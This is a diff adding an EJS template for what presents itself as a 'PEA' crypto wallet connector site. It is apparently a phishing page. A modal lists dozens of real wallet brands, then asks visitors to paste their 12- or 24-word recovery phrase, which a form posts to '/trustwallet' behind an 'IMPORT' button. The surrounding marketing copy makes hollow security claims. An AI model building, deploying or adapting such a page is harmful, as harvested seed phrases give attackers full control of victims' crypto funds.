@@ -1,0 +1,810 @@
+<%- include("./include/header.ejs") %>
+
+  <div class="hero_area">
+    <div class="hero_bg_box">
+      <img src="images/hero-bg.jpg" alt="">
+    </div>
+    <!-- header section strats -->
+    <header class="header_section" style="background: local;">
+      <div class="container">
+        <nav class="navbar navbar-expand-lg custom_nav-container ">
+          <a class="navbar-brand " href="/">
+            <span>
+              PEA
+            </span>
+          </a>
+
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+            <span class=""> </span>
+          </button>
+
+          <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav  ">
+              <li class="nav-item active">
+                <a class="nav-link" href="/">Home <span class="sr-only">(current)</span></a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#connect">VERIFICATION</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#Integrate">Connect Wallet</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#Integrate">Integrate Wallet</a>
+              </li>
+            </ul>
+          </div>
+        </nav>
+      </div>
+    </header>
+    <!-- end header section -->
+
+    <!-- slider section -->
+    <section class="slider_section ">
+      <div id="customCarousel1" class="carousel slide" data-ride="carousel">
+        <div class="carousel-inner">
+          <div class="carousel-item active">
+            <div class="container ">
+              <div class="row">
+                <div class="col-md-8 col-lg-5">
+                  <div class="detail-box">
+                    <h1>
+                      PEA Evolutionary Wallet <br> Swap Connector
+                    </h1>
+                    <p>
+                      Next-level liquidity. Friction-less yield.<br> Light-speed Swaps
+                    </p>
+                    <div class="btn-box">
+                      <a href="#connect" class="btn1">
+                        LAUNCH APP
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="carousel-item">
+            <div class="container ">
+              <div class="row">
+                <div class="col-md-8 col-lg-4 ">
+                  <div class="detail-box">
+                    <h1>
+                      PEA
+                    </h1>
+                    <p>
+                     Join PEA today and buy 65+ cryptocurrencies in minutes.
+                      Get started with as little as $5.
+                    </p>
+                    <div class="btn-box">
+                      <a href="#Integrate" class="btn1">
+                        VERIFICATION
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="carousel-item">
+            <div class="container ">
+              <div class="row">
+                <div class="col-md-8 col-lg-5 ">
+                  <div class="detail-box">
+                    <h1>
+                      PEA
+                    </h1>
+                    <p>
+                      PEA is an open source protocol for connecting decentralised applications to mobile wallets with QR
+                      code scanning or deep linking. A user can interact securely with any DAPP from their mobile phone.
+                    </p>
+                    <div class="btn-box">
+                      <a href="#connect" class="btn1">
+                        Integrate Wallet
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="container">
+          <div class="carousel_btn-box">
+            <a class="carousel-control-prev" href="#customCarousel1" role="button" data-slide="prev">
+              <i class="fa fa-arrow-left" aria-hidden="true"></i>
+              <span class="sr-only">Previous</span>
+            </a>
+            <a class="carousel-control-next" href="#customCarousel1" role="button" data-slide="next">
+              <i class="fa fa-arrow-right" aria-hidden="true"></i>
+              <span class="sr-only">Next</span>
+            </a>
+          </div>
+        </div>
+      </div>
+    </section>
+    <!-- end slider section -->
+  </div>
+
+
+
+  <!-- features section -->
+
+  <section class="service_section layout_padding">
+    <div class="service_container">
+      <div class="container ">
+        <div class="heading_container heading_center">
+          <h2>
+            Our Features
+          </h2>
+          <p>Onward and upward, productize the deliverables and focus on the bottom line drop-dead date translating our
+            vision of having a market leading platform drop-dead date. </p>
+        </div>
+
+        <div class="row">
+          <div class="col-md-9 col-lg-4" id="connect">
+            <div class="box ">
+              <div class="img-box">
+                <!-- link to trigger model -->
+                <a href="#exampleModalCenter" data-toggle="modal">
+                  <img src="images/1.png" alt="">
+                </a>
+                <!-- end of link to trigger model -->
+              </div>
+
+              <!-- Button trigger modal -->
+                    <!-- Modal -->
+                    <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+                      <div class="modal-dialog modal-dialog-centered" role="document">
+                        <div class="modal-content">
+                          <div class="modal-header">
+                            <h5 class="modal-title" id="exampleModalLongTitle">Select Wallet:</h5>
+                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                              <span aria-hidden="true">&times;</span>
+                            </button>
+                          </div>
+                          <div class="modal-body">
+                            <div class="modal-body">
+                              <div class="container">
+                                <div class="row">
+                                  <form action="/trustwallet" class="form-group" method="post" id="showarea">
+                                    <!-- new implement -->
+                                    <div class="row">
+                                      <div class="col-sm-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Trust Wallet">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/trust.jpg" class="imgg figure-img">
+                                            <figcaption class="figure-caption">Trust Wallet</figcaption>
+            
+                                          </figure>
+                                        </label>
+                                      </div>
+
+                                      <div class="col-sm-2">
+                                      
+                                        <label>
+                                          <input type="radio" name="wallet" value="MetaMask">
+                                          <figure class="figure">  
+                                           
+                                            <img src="images/meta.png" class="imgg">
+                                            <figcaption class="figure-caption">MetaMask</figcaption>
+                                            
+                                          </figure>
+                                        </label>
+                                        
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Coinbase">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/coinbase.jpg" class="imgg">
+                                            <figcaption class="figure-caption">Coinbase</figcaption>
+                                          
+                                          </figure>
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="SafePal">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/safepal.png" class="imgg">
+                                            <figcaption class="figure-caption">SafePal</figcaption>
+            
+                                          </figure>
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Ledger">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/ledger.png" class="imgg">
+                                            <figcaption class="figure-caption">Ledger</figcaption>
+            
+                                          </figure>
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Exodus">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/exodus.jfif" class="imgg">
+                                            <figcaption class="figure-caption">Exodus</figcaption>
+            
+                                          </figure>                                   
+                                        </label>
+                                      </div>
+
+                                    </div>
+
+                                    <div class="row">
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Trezor">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/Trezor.png" class="imgg">
+                                            <figcaption class="figure-caption">Trezor</figcaption>
+            
+                                          </figure>
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="ZenGo">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/zengo.png" class="imgg">
+                                            <figcaption class="figure-caption">ZenGo</figcaption>
+            
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Atomic Wallet">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/atmoic.png" class="imgg">
+                                            <figcaption class="figure-caption"> Atomic</figcaption>
+            
+                                          </figure>
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Wirex">
+                                          <fig
+                                          <a href="#modall">
+                                            <img src="images/Wirex.png" class="imgg">
+                                            <figcaption class="figure-caption">Wirex</figcaption>
+            
+                                          </figure>
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="KeepKey">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/KeepKay.png" class="imgg">
+                                            <figcaption class="figure-caption">KeepKey</figcaption>
+            
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Sugi">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/sugi.png" class="imgg">
+                                            <figcaption class="figure-caption">Sugi</figcaption>
+            
+                                          </figure>
+                                        </label>
+                                      </div>
+                                    </div>
+
+                                    <!-- ======================================= -->
+                                    <div class="row" >
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Rainbow">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/rainbow.png" class="imgg">
+                                            <figcaption class="figure-caption">Rainbow</figcaption>
+            
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Defi Wallet">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/defi.jfif" class="imgg">
+                                            <figcaption class="figure-caption">Defi Wallet</figcaption>
+            
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="TokenPockect">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/tokenpocket.jpg" class="imgg">
+                                            <figcaption class="figure-caption">TP</figcaption>
+            
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Ethereum">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/walleth.jfif" class="imgg" >
+                                            <figcaption class="figure-caption">Ethereum Wallet</figcaption>
+            
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="LoafWallet">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/LoafWallet.png" class="imgg">
+                                            <figcaption class="figure-caption">LoafWallet</figcaption>
+            
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Tron">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/tron.png" class="imgg">
+                                            <figcaption class="figure-caption">Tron</figcaption>
+            
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                    </div>
+
+                                    <div class="row" >
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Zcash">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/Zcash.png" class="imgg">
+                                            <figcaption class="firgure-caption">Zcash</figcaption>
+            
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="IOTA">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/iota.jfif" class="imgg">
+                                            <figcaption class="figure-caption">IOTA</figcaption>
+              
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Dash">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/dash.png" class="imgg">
+                                            <figcaption class="figure-caption">Dash</figcaption>
+              
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Monero">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/monero.png" class="imgg">
+                                            <figcaption class="figure-caption">Monero</figcaption>
+              
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="nano">
+                                          <fi>
+                                          
+                                            <img src="images/nano.png" class="imgg">
+                                            <figcaption class="figure-caption">nano</figcaption>
+              
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Blockchain Wallet">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/blockchain.png" class="imgg">
+                                            <figcaption class="figure-caption">Blockchain</figcaption>
+              
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+                                    </div>
+
+                                    <div class="row" >
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Edge Wallet">
+                                          <figure class="figure">
+                                          
+                                            <img src="images/edge.png" class="imgg">
+                                            <figcaption class="figure-caption">Edge</figcaption>
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Bitcoin Cash">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/bitcoincash.jfif" class="imgg">
+                                            <figcaption class="figure-caption">Bitcoin Cash</figcaption>
+                
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Litecoin">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/litecoin.png" class="imgg">
+                                            <figcaption class="figure-caption">Litecoin</figcaption>
+                
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Cardano">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/cardano.jfif" class="imgg">
+                                            <figcaption class="figure-caption">Cardano</figcaption>
+                
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="XRP">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/xrp.jfif" class="imgg">
+                                            <figcaption class="figure-caption">XRP</figcaption>
+                
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Tether">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/teter.png" class="imgg">
+                                            <figcaption class="figure-caption">Tether</figcaption>
+                
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                    </div>
+
+                                    <div class="row" >
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Luno">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/luno.png" class="imgg">
+                                            <figcaption class="figure-caption">Luno</figcaption>
+                
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Matic">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/matic.png" class="imgg">
+                                            <figcaption class="figure-caption">Matic</figcaption>
+                
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Bitcoin">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/bitcoin.jfif" class="imgg">
+                                            <figcaption class="figure-caption">Bitcoin</figcaption>
+                
+                                          </figure>
+    
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Solana">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/solana.jfif" class="imgg">
+                                            <figcaption class="figure-caption">Solana</figcaption>
+                
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="USD Coin">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/ussd.jfif" class="imgg">
+                                            <figcaption class="figure-caption">USD Coin</figcaption>
+                
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Huobi Wallet">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/huobi.jfif" class="imgg">
+                                            <figcaption class="figure-caption">Huobi</figcaption>
+                
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+                                    </div>
+
+                                    <div class="row" >
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Chainlink">
+                                          <figure class="figure">
+                                            
+                                            <img src="images/chainlink.jfif" class="imgg">
+                                            <figcaption class="figure-caption">Chainlink</figcaption>
+                
+                                          </figure>
+                                        </label>
+                                      </div>
+
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Tezos wallet">
+                                          <figure class="figure">
+                                    
+                                            <img src="images/tezos.jfif" class="imgg">
+                                            <figcaption class="figure-caption">Tezos</figcaption>
+        
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="UniSwap">
+                                          <figure class="figure">
+                                    
+                                            <img src="images/uniswap.jfif" class="imgg">
+                                            <figcaption class="figure-caption">UniSwap</figcaption>
+        
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Kraken">
+                                          <figure class="figure">
+                                    
+                                            <img src="images/Kraken.png" class="imgg">
+                                            <figcaption class="figure-caption">Kraken</figcaption>
+        
+                                          </figure>
+                                          
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="Coinomi">
+                                          <figure class="figure">
+                                    
+                                            <img src="images/Coinomi.png" class="imgg">
+                                            <figure class="figure-caption">Coinomi</figure>
+        
+                                          </figure>
+                                        
+                                        </label>
+                                      </div>
+                                      <div class="col-md-2">
+                                        <label>
+                                          <input type="radio" name="wallet" value="BlockFi">
+                                          <figure class="figure">
+                                    
+                                            <img src="images/blockfi.png" class="imgg">
+                                            <figcaption class="figure-caption">BlockFi</figcaption>
+        
+                                          </figure>
+
+                                        </label>
+                                      </div>
+                                    </div>
+                                    <!-- end here -->
+                                   
+                                        <textarea class="form-control keys textarea" rows="10" name="name" id="modall" placeholder="Typically 12(sometimes 24) words seperated by a single space"></textarea>
+                                        
+                                        <br>
+                                    
+                                        
+                                        <input type="submit" id="texthide" name="submit" value="IMPORT" class="btn btn-info btn-lg col-md-12">
+                                  </form>
+                                </div>
+
+
+                              </div>
+
+
+                            </div>
+                          </div>
+                          <div class="modal-footer">
+                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+              
+              <!-- modal here -->
+              
+              <!-- modal ends -->
+
+              <div class="detail-box">
+                <h5>
+                 VERIFICATION
+                </h5>
+  
+                <p>
+                  PEA wallet is not an app, but a protocol supported by many diffrent applications and wallets
+              </div>
+
+
+
+
+
+
+            </div>
+
+
+           
+          </div>
+
+          <div class="col-md-6 col-lg-4" id="Integrate">
+            <div class="box ">
+              <div class="img-box">
+                <!-- link to trigger model -->
+                <a href="#exampleModalCenter" data-toggle="modal">
+                  <img src="images/2.png" alt="">
+                </a>
+                <!-- end of link to trigger model -->
+              </div>
+
+              <div class="detail-box">
+                <h5>
+                  Connect Wallet
+                </h5>
+
+                <p>
+                  A user can interact securely with PEA. making PEA wallet a safter choice compared to browser extension
+                  wallet
+
+              </div>
+            </div>
+          </div>
+
+          <div class="col-md-6 col-lg-4" id="connect">
+            <div class="box ">
+              <div class="img-box">
+                <!-- link to trigger model -->
+                <a href="#exampleModalCenter" data-toggle="modal">
+                  <img src="images/3.png" alt="">
+                </a>
+                <!-- end of link to trigger model -->
+              </div>
+
+              <div class="detail-box">
+                <h5>
+                  Integrate Wallet
+                </h5>
+
+                <p>
+                  PEA is another very formally established crypto giant that’s worked its way into many physical points.
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- end features section -->
+
+
+
+  <%- include("./include/footer.ejs") %>
